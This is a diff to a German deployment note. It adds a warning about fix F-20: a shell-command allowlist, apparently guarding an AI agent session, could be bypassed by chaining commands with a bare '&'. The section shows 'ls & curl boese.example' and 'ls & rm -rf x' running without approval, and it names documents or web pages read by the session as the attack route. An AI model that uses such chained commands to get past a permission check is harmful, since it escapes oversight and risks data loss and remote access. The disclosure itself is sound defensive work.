@@ -36,6 +36,26 @@ ungedeployt, und die Wache, die es hätte melden können, sah den Branch nicht.
 **`requirements.txt` ist seit dem 29.08. unverändert** — kein pip-Schritt, kein
 venv-Block. Der Deploy ist `git pull` und Neustart.
 
+### ⚠️ Seit heute Nachmittag ist ein Sicherheits-Fix dabei
+
+Beim Aufräumen gefunden und am selben Tag behoben (**F-20**): Ein Befehl mit
+einem freistehenden `&` umging die **gesamte** Positivliste.
+
+```
+ls & curl boese.example   →  lief FREI, ohne Rückfrage
+ls & rm -rf x             →  lief FREI, ohne Rückfrage
+```
+
+Der Grund: Die Prüfung sah nur das erste Verb (`ls`, erlaubt) und übersprang
+den Rest, weil dort kein Schrägstrich stand — **die Shell führte trotzdem
+beides aus.** Das galt in **jedem** Modus, auch im Genehmigen-Zustand, und es
+war **vorbestehend**, nicht neu: gegen den Stand vom 29.08. gemessen, dort
+ebenso offen. **Auf dem laufenden Server ist diese Lücke also gerade offen.**
+
+Kein Hinweis darauf, dass sie je genutzt wurde — der Angriffsweg wäre ein
+Dokument oder eine Webseite, die die Sitzung liest. **Das ist der Grund, warum
+der Deploy heute nicht bis morgen warten sollte.**
+
 ---
 
 ## Schritt 1 — Deploy
